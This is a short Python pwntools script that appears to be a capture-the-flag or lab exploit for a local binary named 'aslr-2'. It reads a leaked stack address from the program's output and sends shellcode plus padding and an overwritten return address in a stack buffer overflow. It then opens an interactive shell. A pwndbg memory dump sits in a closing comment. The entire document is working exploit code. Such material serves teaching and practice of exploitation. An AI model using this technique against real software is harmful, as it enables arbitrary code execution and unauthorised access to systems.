#!/usr/bin/env python

from pwn import *

p = process("./aslr-2")
f = open("shellcode.bin", "r")
shellcode = f.read().strip()
f.close()

l = p.recvline(1)
l = p.recvline(2)
addr = l.split()
addr = int(addr[5],16)

buffer = shellcode + "A"*(140-36) + p32(addr-0x88)

p.sendline(buffer)
p.interactive()

#pwndbg> 0xb7f2f000 0xbfeaf5b8 0x80484e2 0x8048628 0x1 0xbfeaf5b8 0x80484ea (nil) 0x1 0xb7f74918 0xf0b5ff 0xb7f74000 0x804824c 0xc2 0xb7e0d6bb
